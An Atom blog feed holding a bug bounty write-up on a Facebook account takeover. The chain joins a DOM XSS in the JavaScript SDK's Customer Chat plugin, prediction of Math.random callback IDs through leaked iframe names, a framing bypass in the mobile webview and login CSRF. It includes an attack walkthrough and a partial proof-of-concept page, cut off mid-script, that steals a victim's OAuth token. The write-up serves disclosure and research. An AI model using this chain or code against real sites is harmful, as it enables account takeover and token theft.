<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-17T15:27:42+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Youssef Sammouda (sam0) personal blog</title><subtitle>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</subtitle><entry><title type="html">Account Takeover in Facebook mobile app due to usage of cryptographically unsecure random number generator and XSS in Facebook JS SDK</title><link href="http://localhost:4000/uncategorized/2026/01/17/math-random-facebook-sdk.html" rel="alternate" type="text/html" title="Account Takeover in Facebook mobile app due to usage of cryptographically unsecure random number generator and XSS in Facebook JS SDK" /><published>2026-01-17T00:00:00+02:00</published><updated>2026-01-17T00:00:00+02:00</updated><id>http://localhost:4000/uncategorized/2026/01/17/math-random-facebook-sdk</id><content type="html" xml:base="http://localhost:4000/uncategorized/2026/01/17/math-random-facebook-sdk.html"><![CDATA[<h1 id="facebook-javascript-sdk-and-facebook-plugins">Facebook Javascript SDK and Facebook plugins</h1>
<hr />
<p><br /></p>

<p>Meta provides several embeddable plugins such as the <code class="language-plaintext highlighter-rouge">Like</code> button, <code class="language-plaintext highlighter-rouge">Customer Chat</code> plugin, and <code class="language-plaintext highlighter-rouge">Feedback</code> plugin. These plugins are hosted under <code class="language-plaintext highlighter-rouge">www.facebook.com</code> and are designed to be embedded into third-party websites using iframe elements.</p>

<p>The typical integration flow works as follows:</p>

<ol>
  <li>A website includes the <code class="language-plaintext highlighter-rouge">Facebook JavaScript SDK</code>.</li>
  <li>The site calls SDK functions such as <code class="language-plaintext highlighter-rouge">FB.init()</code> and <code class="language-plaintext highlighter-rouge">FB.ui()</code>.</li>
  <li>The SDK dynamically creates an iframe pointing to a plugin endpoint, for example the <code class="language-plaintext highlighter-rouge">https://www.facebook.com/plugins/customerchat.php</code> plugin</li>
  <li>The iframe is initialized with url parameters that include:
    <ul>
      <li>The host website origin</li>
      <li>A callback identifier which was randomly generated</li>
    </ul>
  </li>
</ol>

<p>Communication between the host website and the plugin iframe is implemented using <code class="language-plaintext highlighter-rouge">postMessage</code>.<br />
The plugin sends messages to its parent window, and the SDK on the host side listens for those messages and dispatches them internally.</p>

<p>To prevent arbitrary message injection, the SDK enforces two checks on received messages:</p>
<ul>
  <li>The message must originate from <code class="language-plaintext highlighter-rouge">www.facebook.com</code> (where the plugins are hosted)</li>
  <li>The message must include the correct callback identifier (random string)</li>
</ul>

<p>Only messages that satisfy both conditions are accepted and processed by the SDK.</p>

<h1 id="xss-in-javascript-sdk-customer-chat-plugin">XSS in JavaScript SDK Customer Chat Plugin</h1>
<hr />
<p><br />
While reviewing the Facebook JavaScript SDK, I noticed that the SDK registers a cross-window message listener for messages coming from the Customer Chat plugin iframe.</p>

<p>The relevant code sets up a message handler that forwards incoming messages to an internal event system <code class="language-plaintext highlighter-rouge">g.inform("xd." + a.type, a);</code>, which sends an event named <code class="language-plaintext highlighter-rouge">xd.&lt;type&gt;</code> with <code class="language-plaintext highlighter-rouge">&lt;type&gt;</code> form the incoming message.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">ES</span><span class="p">(</span><span class="dl">"</span><span class="s2">Object</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">assign</span><span class="dl">"</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="nx">j</span><span class="p">,</span> <span class="p">{</span>
                      <span class="na">app_id</span><span class="p">:</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.Runtime</span><span class="dl">"</span><span class="p">).</span><span class="nf">getClientID</span><span class="p">(),</span>
                      <span class="na">locale</span><span class="p">:</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.Runtime</span><span class="dl">"</span><span class="p">).</span><span class="nf">getLocale</span><span class="p">(),</span>
                      <span class="na">sdk</span><span class="p">:</span> <span class="dl">"</span><span class="s2">joey</span><span class="dl">"</span><span class="p">,</span>
                      <span class="na">kid_directed_site</span><span class="p">:</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.Runtime</span><span class="dl">"</span><span class="p">).</span><span class="nf">getKidDirectedSite</span><span class="p">(),</span>
                      <span class="na">channel</span><span class="p">:</span> <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.XD</span><span class="dl">"</span><span class="p">).</span><span class="nf">handler</span><span class="p">(</span>
                        <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
                          <span class="nx">a</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="nx">g</span><span class="p">.</span><span class="nf">inform</span><span class="p">(</span><span class="dl">"</span><span class="s2">xd.</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">.</span><span class="nx">type</span><span class="p">,</span> <span class="nx">a</span><span class="p">);</span>
                        <span class="p">},</span>
                        <span class="dl">"</span><span class="s2">parent.parent</span><span class="dl">"</span><span class="p">,</span>
                        <span class="o">!</span><span class="mi">0</span><span class="p">,</span>
                      <span class="p">),</span>
                    <span class="p">});</span>
</code></pre></div></div>

<p>This SDK setup handler/subscriber functions for these events. One such handler is registered as follows:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">this</span><span class="p">.</span><span class="nf">subscribe</span><span class="p">(</span><span class="dl">"</span><span class="s2">xd.mpn.setupIconIframe</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">a</span><span class="p">.</span><span class="nc">$CustomerChat20</span><span class="p">(</span><span class="nx">b</span><span class="p">);</span>
                  <span class="p">});</span>
</code></pre></div></div>

<p>When the event <code class="language-plaintext highlighter-rouge">xd.mpn.setupIconIframe</code> is received, the function <code class="language-plaintext highlighter-rouge">$CustomerChat20</code> is invoked with attacker-controlled data.</p>

<p>Inside this function, the SDK extracts an <code class="language-plaintext highlighter-rouge">iconSVG</code> field from the message and injects it directly into the DOM:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">e</span><span class="p">.</span><span class="nx">$CustomerChat20</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
                  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
                  <span class="k">this</span><span class="p">.</span><span class="nx">$CustomerChat1</span> <span class="o">&amp;&amp;</span>
                    <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.DOM</span><span class="dl">"</span><span class="p">).</span><span class="nf">remove</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">$CustomerChat1</span><span class="p">);</span>
                  <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">frameName</span><span class="p">,</span>
                    <span class="nx">f</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">iconSVG</span><span class="p">,</span>
                    <span class="nx">g</span> <span class="o">=</span> <span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.DialogUtils</span><span class="dl">"</span><span class="p">).</span><span class="nf">setupNewDialog</span><span class="p">(),</span>
                    <span class="nx">h</span> <span class="o">=</span> <span class="nc">ES</span><span class="p">(</span><span class="dl">"</span><span class="s2">JSON</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">parse</span><span class="dl">"</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="nx">a</span><span class="p">.</span><span class="nx">cssText</span><span class="p">),</span>
                    <span class="nx">i</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">div</span><span class="dl">"</span><span class="p">);</span>
                  <span class="nx">f</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nf">d</span><span class="p">(</span><span class="dl">"</span><span class="s2">sdk.DOM</span><span class="dl">"</span><span class="p">).</span><span class="nf">html</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">f</span><span class="p">),</span>

</code></pre></div></div>

<p>Because <code class="language-plaintext highlighter-rouge">iconSVG</code> is injected without sanitization, this results in a DOM-based cross-site scripting vulnerability on the host website.</p>

<p>At this stage, exploitation appears impossible due to two constraints:</p>

<ul>
  <li>Messages must originate from <code class="language-plaintext highlighter-rouge">www.facebook.com</code></li>
  <li>The attacker must know the random callback string</li>
</ul>

<h3 id="i---sending-messages-from-wwwfacebookcom">I - Sending messages from www.facebook.com</h3>
<hr />
<p><br />
To satisfy the message origin requirement, I identified the following endpoint:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://www.facebook.com/plugins/feedback.php?
<span class="err">&amp;</span>api_key
<span class="err">&amp;</span>channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23
    %26relation=parent.parent.frames[0]
    %26cb=${encodeURIComponent(INJECTION_POINT)}
    %26origin=${target}
<span class="err">&amp;</span>href=https%3A%2F%2Fwww.facebook.com%2F
<span class="err">&amp;</span>locale=en_US
<span class="err">&amp;</span>numposts=10
<span class="err">&amp;</span>order_by=time
<span class="err">&amp;</span>sdk=joey<span class="err">&amp;</span>version=v2.3
<span class="err">&amp;</span>width=600
<span class="err">&amp;</span>_rdr`
</code></pre></div></div>

<p>When loaded, this plugin sends a message from a Facebook origin to the embedding website that loaded the SDK with <code class="language-plaintext highlighter-rouge">INJECTION_POINT</code> in the message without any sanitization, meaning that it’s possible to <code class="language-plaintext highlighter-rouge">&amp;</code> andd more text.</p>

<h3 id="ii---random-string-generation">II - Random String Generation</h3>
<hr />
<p><br />
To validate incoming postMessage events, the Facebook JavaScript SDK relies on a callback identifier generated at runtime. This identifier is treated as a shared secret between the host page and the embedded plugin iframe, and is required for message acceptance.</p>

<p>Tracing the generation of this identifier reveals that it is produced by the following helper module:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="nf">__d</span><span class="p">(</span>
            <span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">,</span>
            <span class="p">[],</span>
            <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
              <span class="kd">function</span> <span class="nf">a</span><span class="p">()</span> <span class="p">{</span>
                <span class="k">return </span><span class="p">(</span>
                  <span class="dl">"</span><span class="s2">f</span><span class="dl">"</span> <span class="o">+</span>
                  <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">30</span><span class="p">)).</span><span class="nf">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">.</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">)</span>
                <span class="p">);</span>
              <span class="p">}</span>
              <span class="nx">f</span><span class="p">[</span><span class="dl">"</span><span class="s2">default</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="nx">a</span><span class="p">;</span>
            <span class="p">},</span>
            <span class="mi">66</span><span class="p">,</span>
          <span class="p">);</span>

</code></pre></div></div>

<p>The callback value is therefore derived directly from <code class="language-plaintext highlighter-rouge">Math.random()</code>, a non‑cryptographic pseudo‑random number generator.</p>

<p>This introduces a critical trust boundary violation: a value that is used as an <em>authentication primitive</em> for cross‑origin messaging is generated using a mechanism that provides no unpredictability guarantees against an active attacker.</p>

<h4 id="1-why-mathrandom-is-inappropriate-in-this-context">1) Why Math.random Is Inappropriate in This Context</h4>

<p><code class="language-plaintext highlighter-rouge">Math.random()</code> is implemented as a deterministic PRNG whose internal state evolves predictably. While sufficient for non‑security use cases (UI randomness, sampling, etc.), it is explicitly unsuitable for any scenario where unpredictability is relied upon for security decisions.</p>

<p>In this case, the callback identifier functions as:</p>
<ul>
  <li>A message authentication token</li>
  <li>A gatekeeper for privileged SDK message handlers</li>
  <li>The sole barrier preventing arbitrary message injection</li>
</ul>

<p>Once an attacker can observe a sequence of outputs from the same PRNG instance, the internal state can be inferred. This allows the attacker to:</p>
<ul>
  <li>Predict future outputs</li>
  <li>Reconstruct recently generated past values</li>
  <li>Forge valid callback identifiers without guessing</li>
</ul>

<p>The security of the entire message validation mechanism therefore collapses if PRNG outputs can be observed.</p>

<h4 id="2-observing-prng-outputs-via-plugin-iframe">2) Observing PRNG outputs via Plugin iframe</h4>
<p>Further analysis of SDK internals shows that the same <code class="language-plaintext highlighter-rouge">guid()</code> function is reused when creating plugin iframes. Specifically, if an explicit iframe name is not provided, the SDK generates one automatically:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="nf">__d</span><span class="p">(</span>
            <span class="dl">"</span><span class="s2">sdk.createIframe</span><span class="dl">"</span><span class="p">,</span>
            <span class="p">[</span><span class="dl">"</span><span class="s2">DOMEventListener</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">getBlankIframeSrc</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">isNumberLike</span><span class="dl">"</span><span class="p">],</span>
            <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">e</span><span class="p">,</span> <span class="nx">f</span><span class="p">,</span> <span class="nx">g</span><span class="p">)</span> <span class="p">{</span>
              <span class="kd">function</span> <span class="nf">a</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nc">ES</span><span class="p">(</span><span class="dl">"</span><span class="s2">Object</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">assign</span><span class="dl">"</span><span class="p">,</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="p">{},</span> <span class="nx">a</span><span class="p">),</span>
                  <span class="nx">e</span><span class="p">,</span>
                  <span class="nx">f</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">name</span> <span class="o">||</span> <span class="nf">c</span><span class="p">(</span><span class="dl">"</span><span class="s2">guid</span><span class="dl">"</span><span class="p">)(),</span>

</code></pre></div></div>

<p>This value becomes the <code class="language-plaintext highlighter-rouge">window.name</code> of the newly created iframe.</p>

<p>Because iframe names are part of the browsing context and persist across navigations, this creates an unintended side channel: any party that can later obtain same‑origin access to the iframe window can read the name and recover a raw <code class="language-plaintext highlighter-rouge">Math.random()</code> output.</p>

<p>This means that plugin iframe creation leaks PRNG outputs that originate from the same generator instance responsible for producing message callback identifiers. However, in practice, most websites embed only a single Facebook plugin per page. This initially appears to limit exploitation, as reconstructing PRNG state typically requires observing multiple sequential outputs.</p>

<p>However, the SDK exposes additional behavior that allows forced regeneration of plugin iframes without requiring a full page reload.</p>

<h4 id="3-forcing-reinitialization-via-initpost">3) Forcing reinitialization via init:post</h4>
<hr />
<p><br />
The SDK registers other listeners beside <code class="language-plaintext highlighter-rouge">xd.&lt;type&gt;</code> ones targeting plugins, one of them is the <code class="language-plaintext highlighter-rouge">init:post</code> event:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="nx">sdk</span><span class="p">.</span><span class="nx">Event</span><span class="p">.</span><span class="nf">subscribe</span><span class="p">(</span><span class="dl">"</span><span class="s2">init:post</span><span class="dl">"</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">xfbml</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">XFBML</span><span class="p">.</span><span class="nf">parse</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">});</span>

</code></pre></div></div>

<p>When a message containing <code class="language-plaintext highlighter-rouge">xfbml: true</code> is received, the SDK re‑parses the page and re‑initializes all XFBML plugins. From the SDK’s perspective, this is equivalent to the initial page load.</p>

<p>Each reinitialization:</p>
<ul>
  <li>Destroys the existing plugin iframe</li>
  <li>Creates a new iframe</li>
  <li>Generates a new iframe name via <code class="language-plaintext highlighter-rouge">guid()</code></li>
  <li>Advances the PRNG state</li>
</ul>

<p>By repeatedly triggering this event, an attacker can force the SDK to emit an arbitrary number of PRNG outputs.</p>

<h4 id="4-extracting-iframe-window-names">4) Extracting iframe window names</h4>

<p>To read the generated iframe names, the attacker must control the top‑level browsing context.</p>

<p>The attack layout is as follows:</p>

<ul>
  <li>The attacker embeds the victim website in an iframe</li>
  <li>The victim website embeds the Facebook plugin iframe</li>
  <li>The attacker navigates the plugin iframe to an attacker‑controlled origin via <code class="language-plaintext highlighter-rouge">window.frames[0].frames[0] = "https://attacker.com"</code></li>
  <li>Same‑origin access is restored</li>
  <li>The attacker reads the iframe name via <code class="language-plaintext highlighter-rouge">window.frames[0].frames[0].name</code></li>
</ul>

<p>This technique requires the victim website to allow framing, either due to missing <code class="language-plaintext highlighter-rouge">X-Frame-Options</code> or a permissive <code class="language-plaintext highlighter-rouge">frame-ancestors</code> CSP directive.</p>

<h4 id="5-attack-attempt-1">5) Attack Attempt #1</h4>

<ul>
  <li>Attacker embeds victim website in an iframe</li>
  <li>Victim website embeds Facebook Customer Chat plugin via Facebook SDK</li>
  <li>Attacker leaks plugin iframe window name</li>
  <li>Attacker forces plugin reinitialization</li>
  <li>Attacker repeats above 2 steps multiple times</li>
  <li>Attacker reconstructs Math.random state</li>
  <li>Attacker calculates callback string</li>
  <li>Attacker sends crafted message from <code class="language-plaintext highlighter-rouge">www.facebook.com</code> origin</li>
  <li>DOM XSS is triggered on the victim website</li>
</ul>

<p>While the exploit chain is technically complete, the immediate impact is constrained by deployment realities:</p>

<ul>
  <li>The XSS occurs on the embedding website, not on www.facebook.com</li>
  <li>Exploitation depends on framing being allowed</li>
  <li>Many high‑value sites enforce strict framing policies</li>
</ul>

<p>As a result, exploitation against arbitrary third‑party websites would likely be assessed as low to medium impact. This motivated a shift in focus toward identifying Facebook‑owned surfaces that:</p>
<ul>
  <li>Embed the affected plugin</li>
  <li>Allow framing or equivalent access</li>
  <li>Elevate the impact to a first‑party security issue</li>
</ul>

<h3 id="iii---iframe-protection-bypass-in-wwwfacebookcom">III - Iframe protection bypass in www.facebook.com</h3>
<hr />
<p><br />
Finding a particular page with a misconfigured <code class="language-plaintext highlighter-rouge">XFO</code> or <code class="language-plaintext highlighter-rouge">frame-ancestors</code> won’t cut it since we have another condition later to find a Facebook page with the customer plugin embedded.
Realistically, it would be unlikely to find a single page with the two conditions met, so i focused on finding a more general issue that would affect the entire website, likely it was possible to find one:</p>

<p>While playing around in Facebook mobile application in iOS/Android, i noticed that in some requests the XFO header would be like this:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">X-Frame-Options: SAMEORIGIN</code></li>
</ul>

<p>Although this is totally normal, i probably never saw it before used in WEB. This made me suspicious, so i tried to load a page that has <code class="language-plaintext highlighter-rouge">frame-ancestors</code> set to any domain. As a result the returned XFO was found to be set :</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">X-Frame-Options: ALLOW-FROM domain</code></li>
</ul>

<p>This is perfect! it means that there’s actually no frame protection at all, since <code class="language-plaintext highlighter-rouge">ALLOW-FROM</code> is not supported anymore in modern browsers.</p>

<p>Okay so now we have a trick that we can use to disable frame protection, however this trick would only work if a page in normal conditions in web would return <code class="language-plaintext highlighter-rouge">frame-ancestors</code> and allow at least one domain. Unfortunately, this added another condition to already 2 previous conditions so we needed to find a bypass for this.</p>

<h3 id="iv---forcing-frame-ancestors-embed-in-wwwfacebookcom-pages">IV - Forcing frame-ancestors embed in www.facebook.com pages</h3>
<hr />

<p>As we said now we need a way to make any page return <code class="language-plaintext highlighter-rouge">frame-ancestors: anydomain</code> so the bug above triggers.
It was found that Facebook has this feature, it’s called <code class="language-plaintext highlighter-rouge">Compat</code> and it allows other subdomains to include/iframe a page in other subdomains. If any page was appended the parameter:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&amp;</span>cquick=1
<span class="err">&amp;</span>cquick_token=TOKEN
<span class="err">&amp;</span>ctarget=https://www.facebook.com
</code></pre></div></div>

<p>It will return <code class="language-plaintext highlighter-rouge">frame-ancestors: https://www.facebook.com</code> and trigger the previous bug ( of course in a mobile env inside Facebook app webview).</p>

<p>However, you probably noticed the <code class="language-plaintext highlighter-rouge">TOKEN</code>, which immediately raises red flags. It turns out this token is tied to the currently authenticated user, meaning it’s impossible to trigger the compatibility behavior in a victim’s session without knowing their token.</p>

<p>At this point, I had the idea of attempting a classic <code class="language-plaintext highlighter-rouge">login CSRF</code> into my own account. Naturally, this would only lead to XSSing myself, so an additional constraint was needed: we must keep a valid Facebook page open inside an iframe. This page needs to contain something of value in its body, and crucially it must not refresh when it detects a session change.</p>

<h3 id="v---facebook-page-with-customer-chat-plugin-loaded">V - Facebook page with customer chat plugin loaded</h3>

<p>It was dicovered that the page <code class="language-plaintext highlighter-rouge">https://www.facebook.com/business/goals/add-live-chat-to-website-with-messenger</code> had Facebook SDK and loaded the customer chat plugin as a demonstration for the plugin.</p>

<h3 id="vi---predicting-mathrandom-seed">VI - Predicting Math.random() seed</h3>

<p>To avoid making this write-up any longer than it already is, I highly recommend watching PwnFunction’s excellent <a href="&quot;https://www.youtube.com/watch?v=-h_rj2-HP2E">video</a> on this topic. You should also check out his <a href="&quot;https://github.com/PwnFunction/v8-randomness-predictor/blob/main/main.py&quot;">Github repository</a> and the accompanying resources.</p>

<p>My attack did not introduce anything fundamentally new; the only required change was a slight modification to the solver so it would still work even when the supplied seeds were not consecutive. Because the iframe reinitialization trick resets everything, each iframe window name we obtain is actually two steps behind the previous one:</p>

<p>1) Math.random() value for <code class="language-plaintext highlighter-rouge">window.name</code></p>

<p>2) Math.random() value for <code class="language-plaintext highlighter-rouge">callback function</code> &lt;—— Z3 needs to skip this</p>

<p>3) Math.random() value for <code class="language-plaintext highlighter-rouge">iframe id</code> &lt;—— Z3 needs to skip this</p>

<h2 id="final-attack">Final Attack</h2>
<hr />
<p><br /></p>

<p>1) Victim vists attacker’s website in Facbook App</p>

<p>2) Attacker website opens in Facebook App Webview</p>

<p>3) Attacker creates an iframe <code class="language-plaintext highlighter-rouge">[ name:MAIN ]</code>, and load a Facebook page which would contain a sensitive value like OAuth code/token ( xd_arbiter page or /dialog/oauth + ajaxpipe/__a parameters to avoid reloads)</p>

<p>4) Attacker performs a Logout CSRF</p>

<p>5) Attacker performs a Login CSRF into his account</p>

<p>4) Attacker creates another iframe, and loads the Facebook page with customer chat plugin:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://secure.facebook.com/business/goals/add-live-chat-to-website-with-messenger?
<span class="err">&amp;</span>cquick=1
<span class="err">&amp;</span>cquick_token=ATTACKE_TOKEN
<span class="err">&amp;</span>ctarget=https://www.facebook.com
</code></pre></div></div>

<p>5) Attacker redirects <code class="language-plaintext highlighter-rouge">window.frames[1].frames[0]</code> ( containing the plugin script ) to attacker website</p>

<p>6) Attacker saves <code class="language-plaintext highlighter-rouge">window.frames[1].frames[0].name</code></p>

<p>7) Attacker force reinitialization via <code class="language-plaintext highlighter-rouge">init:post</code></p>

<p>8) Attacker repeats steps <code class="language-plaintext highlighter-rouge">5</code>, <code class="language-plaintext highlighter-rouge">6</code> and <code class="language-plaintext highlighter-rouge">7</code> until he gets at least 4 values</p>

<p>9) Attacker sends <code class="language-plaintext highlighter-rouge">Math.random()</code> values to the backend, and gets the next values</p>

<p>10) Attacker force reinitialization via <code class="language-plaintext highlighter-rouge">init:post</code></p>

<p>11) Attacker sends payload message to <code class="language-plaintext highlighter-rouge">window.frames[1]</code> from <code class="language-plaintext highlighter-rouge">facebook.com</code> with the correct callback identifier, using trick in <code class="language-plaintext highlighter-rouge">I</code></p>

<p>12) DOM-XSS achieved in <code class="language-plaintext highlighter-rouge">www.facebook.com</code>, the script would access same-origin iframe <code class="language-plaintext highlighter-rouge">[ name:MAIN ]</code> via <code class="language-plaintext highlighter-rouge">top.frames[0]</code> and reads victim OAuth token</p>

<h2 id="proof-of-concept">Proof of concept</h2>
<hr />
<p><br /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;/head&gt;</span>
    <span class="nt">&lt;body&gt;</span>

        <span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"1"</span> <span class="na">height=</span><span class="s">"1"</span> <span class="na">name=</span><span class="s">"oauth"</span> <span class="na">src=</span><span class="s">"https://www.facebook.com/dialog/oauth..."</span><span class="nt">&gt;&lt;/iframe&gt;</span>
        <span class="nt">&lt;iframe</span> <span class="na">style=</span><span class="s">"position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"</span> <span class="na">id=</span><span class="s">"theframe"</span> <span class="na">name=</span><span class="s">"ddoc"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
        <span class="nt">&lt;iframe</span> <span class="na">width=</span><span class="s">"1"</span> <span class="na">height=</span><span class="s">"1"</span> <span class="na">name=</span><span class="s">"reload"</span> <span class="na">src=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>

        <span class="nt">&lt;script&gt;</span>
        
        <span class="nx">cquick_token</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ATTACKER_COMPAT_TOKEN</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">BACKEND_URL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">ATTACKER_WEBSITE_SOLVER</span><span class="dl">"</span><span class="p">;</span>
        <span class="nx">list_math_random</span><span class="o">=</span> <span class="p">{};</span>

        <span class="cm">/* ==================== STEP 0 ==================== */</span>

        <span class="cm">/* Logout / Login CSRF */</span>
        
        <span class="cm">/* ==================== STEP 1 ==================== */</span>

        <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>

          <span class="c1">// Setup a message listener to collect Math.random() values from plugin iframe</span>

          <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">code</span> <span class="o">&amp;&amp;</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">num</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">xx</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">num</span><span class="p">;</span>
                <span class="nx">value</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
                <span class="nx">value</span> <span class="o">=</span> <span class="nf">toRandom</span><span class="p">(</span><span class="nx">value</span><span class="p">);</span>
                <span class="nx">list_math_random</span><span class="p">[</span><span class="nx">xx</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
          <span class="c1">// Load the Facebook iframe to start the process</span>
          <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">theframe</span><span class="dl">"</span><span class="p">).</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://secure.facebook.com/business/goals/add-live-chat-to-website-with-messenger?wtsid=rdr_0JnaCVB7Xiu2W3gl6&amp;cquick=1&amp;cquick_token=</span><span class="dl">"</span><span class="o">+</span> 
          <span class="nx">cquick_token</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;ctarget=https://www.facebook.com</span><span class="dl">"</span><span class="p">;</span>
          
          <span class="nx">xf</span> <span class="o">=</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
                    <span class="nx">target_frame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">reload</span><span class="dl">"</span><span class="p">).</span><span class="nx">contentWindow</span>
                    <span class="nf">sendMessageFromFacebookOrigin</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;xd_action=dd&amp;data=FB_RPC:{"method":"fireEvent","params":["init:post",{"xfbml":1}]}</span><span class="dl">'</span><span class="p">,</span> <span class="nx">reload</span><span class="p">);</span>
